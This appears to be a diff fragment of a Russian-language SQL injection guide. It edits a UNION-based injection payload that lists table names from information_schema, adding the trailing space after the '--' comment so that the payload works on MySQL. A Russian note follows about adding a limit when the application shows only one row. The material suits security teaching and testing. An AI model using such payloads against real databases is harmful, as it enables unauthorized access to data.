@@ -126,7 +126,7 @@ SELECT version FROM v$instance
 ```sql
 ' UNION SELECT NULL, table_name
   FROM information_schema.tables
-  WHERE table_schema = database()--
+  WHERE table_schema = database()-- 
 ```
 Если приложение отображает только одну строку можно добавить лимит
 ```sql
